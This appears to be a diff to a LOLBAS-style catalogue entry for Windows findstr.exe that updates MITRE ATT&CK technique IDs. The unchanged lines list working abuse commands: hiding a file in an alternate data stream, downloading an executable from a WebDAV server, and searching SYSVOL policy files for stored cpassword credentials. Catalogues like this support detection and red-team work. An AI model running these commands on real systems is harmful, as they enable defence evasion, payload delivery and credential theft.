@@ -9,24 +9,21 @@ Commands:
     Usecase: Add a file to an alternate data stream to hide from defensive counter measures
     Category: ADS
     Privileges: User
-    MitreID: T1096
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1096
+    MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe
     Description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.
     Usecase: Add a file to an alternate data stream from a webdav server to hide from defensive counter measures
     Category: ADS
     Privileges: User
-    MitreID: T1096
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1096
+    MitreID: T1564.004
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: findstr /S /I cpassword \\sysvol\policies\*.xml
     Description: Search for stored password in Group Policy files stored on SYSVOL.
     Usecase: Find credentials stored in cpassword attrbute
     Category: Credentials
     Privileges: User
-    MitreID: T1081
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1081
+    MitreID: T1552.001
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
   - Command: findstr /V /L W3AllLov3DonaldTrump \\webdavserver\folder\file.exe > c:\ADS\file.exe
     Description: Searches for the string W3AllLov3DonaldTrump, since it does not exist (/V) file.exe is downloaded to the target file.
@@ -34,7 +31,6 @@ Commands:
     Category: Download
     Privileges: User
     MitreID: T1185
-    MitreLink: https://attack.mitre.org/wiki/Technique/T1185
     OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
 Full_Path:
   - Path: C:\Windows\System32\findstr.exe
